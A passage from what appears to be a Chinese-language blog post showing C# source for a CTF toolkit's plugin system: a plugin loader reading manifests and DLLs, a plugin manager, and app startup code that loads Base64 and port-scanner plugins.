&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">public</span> IPlugin <span class="title">LoadPlugin</span>(<span class="params"><span class="built_in">string</span> pluginName</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> pluginDir = Path.Combine(_pluginsDirectory, pluginName);</span><br><span class="line">            <span class="keyword">if</span> (!Directory.Exists(pluginDir))</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> DirectoryNotFoundException(<span class="string">$&quot;Plugin directory not found: <span class="subst">&#123;pluginDir&#125;</span>&quot;</span>);</span><br><span class="line">                </span><br><span class="line">            <span class="comment">// 加载插件清单</span></span><br><span class="line">            <span class="keyword">var</span> manifestPath = Path.Combine(pluginDir, <span class="string">&quot;manifest.json&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (!File.Exists(manifestPath))</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FileNotFoundException(<span class="string">&quot;Plugin manifest not found&quot;</span>, manifestPath);</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">var</span> manifestContent = File.ReadAllText(manifestPath);</span><br><span class="line">            <span class="keyword">var</span> manifest = JsonConvert.DeserializeObject&lt;PluginManifest&gt;(manifestContent);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 根据插件类型加载不同类型的插件</span></span><br><span class="line">            <span class="keyword">if</span> (manifest.EntryPoint.EndsWith(<span class="string">&quot;.py&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// Python插件</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> PythonPluginWrapper(pluginDir, manifest);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (manifest.EntryPoint.EndsWith(<span class="string">&quot;.dll&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// .NET插件</span></span><br><span class="line">                <span class="keyword">return</span> LoadDotNetPlugin(pluginDir, manifest);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NotSupportedException(<span class="string">$&quot;Unsupported plugin type: <span class="subst">&#123;manifest.EntryPoint&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">private</span> IPlugin <span class="title">LoadDotNetPlugin</span>(<span class="params"><span class="built_in">string</span> pluginDir, PluginManifest manifest</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> assemblyPath = Path.Combine(pluginDir, manifest.EntryPoint);</span><br><span class="line">            <span class="keyword">if</span> (!File.Exists(assemblyPath))</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FileNotFoundException(<span class="string">&quot;Plugin assembly not found&quot;</span>, assemblyPath);</span><br><span class="line">                </span><br><span class="line">            <span class="comment">// 加载插件程序集</span></span><br><span class="line">            <span class="keyword">var</span> assembly = Assembly.LoadFrom(assemblyPath);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 查找实现IPlugin接口的类型</span></span><br><span class="line">            <span class="keyword">var</span> pluginType = assembly.GetTypes()</span><br><span class="line">                .FirstOrDefault(t =&gt; <span class="keyword">typeof</span>(IPlugin).IsAssignableFrom(t) &amp;&amp; !t.IsInterface);</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">if</span> (pluginType == <span class="literal">null</span>)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> InvalidOperationException(<span class="string">&quot;Plugin does not implement IPlugin interface&quot;</span>);</span><br><span class="line">                </span><br><span class="line">            <span class="comment">// 创建插件实例</span></span><br><span class="line">            <span class="keyword">var</span> plugin = Activator.CreateInstance(pluginType) <span class="keyword">as</span> IPlugin;</span><br><span class="line">            <span class="keyword">if</span> (plugin == <span class="literal">null</span>)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> InvalidCastException(<span class="string">&quot;Failed to cast plugin to IPlugin&quot;</span>);</span><br><span class="line">                </span><br><span class="line">            <span class="comment">// 初始化插件</span></span><br><span class="line">            <span class="keyword">if</span> (!plugin.Init())</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> InvalidOperationException(<span class="string">&quot;Plugin initialization failed&quot;</span>);</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">return</span> plugin;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-插件管理器-PluginSystem-PluginManager-cs"><a href="#4-插件管理器-PluginSystem-PluginManager-cs" class="headerlink" title="4. 插件管理器 (PluginSystem/PluginManager.cs)"></a>4. 插件管理器 (PluginSystem/PluginManager.cs)</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> CTFTool.Interfaces;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CTFTool.PluginSystem</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">PluginManager</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">readonly</span> PluginLoader _pluginLoader;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">readonly</span> Dictionary&lt;<span class="built_in">string</span>, IPlugin&gt; _loadedPlugins = <span class="keyword">new</span> Dictionary&lt;<span class="built_in">string</span>, IPlugin&gt;();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">event</span> EventHandler&lt;PluginEventArgs&gt; PluginLoaded;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">event</span> EventHandler&lt;PluginEventArgs&gt; PluginUnloaded;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">PluginManager</span>(<span class="params"><span class="built_in">string</span> pluginsDirectory</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            _pluginLoader = <span class="keyword">new</span> PluginLoader(pluginsDirectory);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">public</span> IEnumerable&lt;<span class="built_in">string</span>&gt; <span class="title">GetAvailablePlugins</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> Directory.GetDirectories(_pluginLoader.PluginsDirectory)</span><br><span class="line">                .Select(Path.GetFileName);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">public</span> IPlugin <span class="title">GetPlugin</span>(<span class="params"><span class="built_in">string</span> pluginName</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (_loadedPlugins.TryGetValue(pluginName, <span class="keyword">out</span> <span class="keyword">var</span> plugin))</span><br><span class="line">                <span class="keyword">return</span> plugin;</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">bool</span> <span class="title">LoadPlugin</span>(<span class="params"><span class="built_in">string</span> pluginName</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (_loadedPlugins.ContainsKey(pluginName))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">var</span> plugin = _pluginLoader.LoadPlugin(pluginName);</span><br><span class="line">                <span class="keyword">if</span> (plugin == <span class="literal">null</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    </span><br><span class="line">                _loadedPlugins.Add(pluginName, plugin);</span><br><span class="line">                PluginLoaded?.Invoke(<span class="keyword">this</span>, <span class="keyword">new</span> PluginEventArgs(pluginName, plugin));</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                System.Diagnostics.Debug.WriteLine(<span class="string">$&quot;Failed to load plugin <span class="subst">&#123;pluginName&#125;</span>: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">bool</span> <span class="title">UnloadPlugin</span>(<span class="params"><span class="built_in">string</span> pluginName</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (!_loadedPlugins.TryGetValue(pluginName, <span class="keyword">out</span> <span class="keyword">var</span> plugin))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                plugin.Dispose();</span><br><span class="line">                _loadedPlugins.Remove(pluginName);</span><br><span class="line">                PluginUnloaded?.Invoke(<span class="keyword">this</span>, <span class="keyword">new</span> PluginEventArgs(pluginName, plugin));</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                System.Diagnostics.Debug.WriteLine(<span class="string">$&quot;Failed to unload plugin <span class="subst">&#123;pluginName&#125;</span>: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">UnloadAllPlugins</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> pluginNames = <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt;(_loadedPlugins.Keys);</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">var</span> name <span class="keyword">in</span> pluginNames)</span><br><span class="line">            &#123;</span><br><span class="line">                UnloadPlugin(name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">object</span> <span class="title">ExecutePlugin</span>(<span class="params"><span class="built_in">string</span> pluginName, <span class="built_in">dynamic</span> context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> plugin = GetPlugin(pluginName);</span><br><span class="line">            <span class="keyword">if</span> (plugin == <span class="literal">null</span>)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> KeyNotFoundException(<span class="string">$&quot;Plugin not loaded: <span class="subst">&#123;pluginName&#125;</span>&quot;</span>);</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">return</span> plugin.Run(context);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">PluginEventArgs</span> : <span class="title">EventArgs</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> PluginName &#123; <span class="keyword">get</span>; &#125;</span><br><span class="line">        <span class="keyword">public</span> IPlugin Plugin &#123; <span class="keyword">get</span>; &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">PluginEventArgs</span>(<span class="params"><span class="built_in">string</span> pluginName, IPlugin plugin</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            PluginName = pluginName;</span><br><span class="line">            Plugin = plugin;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-应用入口代码-App-xaml-cs"><a href="#5-应用入口代码-App-xaml-cs" class="headerlink" title="5. 应用入口代码 (App.xaml.cs)"></a>5. 应用入口代码 (App.xaml.cs)</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> Windows.ApplicationModel;</span><br><span class="line"><span class="keyword">using</span> Windows.ApplicationModel.Activation;</span><br><span class="line"><span class="keyword">using</span> Windows.UI.Xaml;</span><br><span class="line"><span class="keyword">using</span> Windows.UI.Xaml.Controls;</span><br><span class="line"><span class="keyword">using</span> Windows.UI.Xaml.Navigation;</span><br><span class="line"><span class="keyword">using</span> CTFTool.PluginSystem;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CTFTool</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> 提供特定于应用程序的行为，以补充默认的应用程序类。</span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">    <span class="keyword">sealed</span> <span class="keyword">partial</span> <span class="keyword">class</span> <span class="title">App</span> : <span class="title">Application</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> PluginManager PluginManager &#123; <span class="keyword">get</span>; <span class="keyword">private</span> <span class="keyword">set</span>; &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> 初始化单一实例应用程序对象。这是执行的创作代码的第一行，</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> 已执行，逻辑上等同于 main() 或 WinMain()。</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">App</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">this</span>.InitializeComponent();</span><br><span class="line">            <span class="keyword">this</span>.Suspending += OnSuspending;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 初始化插件管理器</span></span><br><span class="line">            <span class="keyword">var</span> pluginsDirectory = Path.Combine(Package.Current.InstalledLocation.Path, <span class="string">&quot;Plugins&quot;</span>);</span><br><span class="line">            PluginManager = <span class="keyword">new</span> PluginManager(pluginsDirectory);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> 在应用程序由用户正常启动时调用。</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> 将在启动应用程序以打开特定文件等情况下使用。</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name=&quot;e&quot;&gt;</span>有关启动请求和过程的详细信息。<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">OnLaunched</span>(<span class="params">LaunchActivatedEventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Frame rootFrame = Window.Current.Content <span class="keyword">as</span> Frame;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 不要在窗口已包含内容时重复应用程序初始化，</span></span><br><span class="line">            <span class="comment">// 只需确保窗口处于活动状态</span></span><br><span class="line">            <span class="keyword">if</span> (rootFrame == <span class="literal">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 创建要充当导航上下文的框架，并导航到第一页</span></span><br><span class="line">                rootFrame = <span class="keyword">new</span> Frame();</span><br><span class="line">                </span><br><span class="line">                rootFrame.NavigationFailed += OnNavigationFailed;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> (e.PreviousExecutionState == ApplicationExecutionState.Terminated)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//<span class="doctag">TODO:</span> 从之前挂起的应用程序加载状态</span></span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 将框架放在当前窗口中</span></span><br><span class="line">                Window.Current.Content = rootFrame;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (e.PrelaunchActivated == <span class="literal">false</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (rootFrame.Content == <span class="literal">null</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 当导航堆栈尚未还原时，导航到第一页，</span></span><br><span class="line">                    <span class="comment">// 并通过将所需信息作为导航参数传递来配置</span></span><br><span class="line">                    rootFrame.Navigate(<span class="keyword">typeof</span>(MainPage), e.Arguments);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 确保当前窗口处于活动状态</span></span><br><span class="line">                Window.Current.Activate();</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 加载默认插件</span></span><br><span class="line">                LoadDefaultPlugins();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">LoadDefaultPlugins</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 加载基础插件</span></span><br><span class="line">                App.PluginManager.LoadPlugin(<span class="string">&quot;Base64Tool&quot;</span>);</span><br><span class="line">                App.PluginManager.LoadPlugin(<span class="string">&quot;PortScanner&quot;</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 注册插件事件处理程序</span></span><br><span class="line">                App.PluginManager.PluginLoaded += (sender, <span class="keyword">args</span>) =&gt; </span><br><span class="line">                &#123;</span><br><span class="line">                    System.Diagnostics.Debug.WriteLine(<span class="string">$&quot;Plugin loaded: <span class="subst">&#123;<span class="keyword">args</span>.PluginName&#125;</span>&quot;</span>);</span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                System.Diagnostics.Debug.WriteLine(<span class="string">$&quot;Failed to load default plugins: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> 在导航到特定页失败时调用</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name=&quot;sender&quot;&gt;</span>导航失败的框架<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name=&quot;e&quot;&gt;</span>有关导航失败的详细信息<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">OnNavigationFailed</span>(<span class="params"><span class="built_in">object</span> sender, NavigationFailedEventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">&quot;Failed to load Page &quot;</span> + e.SourcePageType.FullName);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> 在应用程序挂起执行时调用。 挂起的状态会保存，</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> 但内存不会被释放，除非内存不足情况需要。</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name=&quot;sender&quot;&gt;</span>挂起的请求的源。<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name=&quot;e&quot;&gt;</span>有关挂起请求的详细信息。<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnSuspending</span>(<span class="params"><span class="built_in">object</span> sender, SuspendingEventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> deferral = e.SuspendingOperation.GetDeferral();</span><br><span class="line">            <span class="comment">//<span class="doctag">TODO:</span> 保存应用程序状态并停止任何后台活动</span></span><br><span class="line">            deferral.Complete();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-主窗口代码-MainWindow-xaml-cs"><a href="#6-主窗口代码-MainWindow-xaml-cs" class="headerlink" title="6. 主窗口代码 (MainWindow.xaml.cs)"></a>6. 主窗口代码 (MainWindow.xaml.cs)</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Microsoft.UI.Xaml;</span><br><span class="line"><span class="keyword">using</span> Microsoft.UI.Xaml.Controls;</span><br><span class="line"><span class="keyword">using</span> Microsoft.UI.Xaml.Media;</span><br><span class="line"><span class="keyword">using</span> CTFTool.Interfaces;</span><br><span class="line"><span class="keyword">using</span> CTFTool.PluginSystem;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CTFTool</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">sealed</span> <span class="keyword">partial</span> <span class="keyword">class</span> <span class="title">MainWindow</span> : <span class="title">Window</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">MainWindow</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span 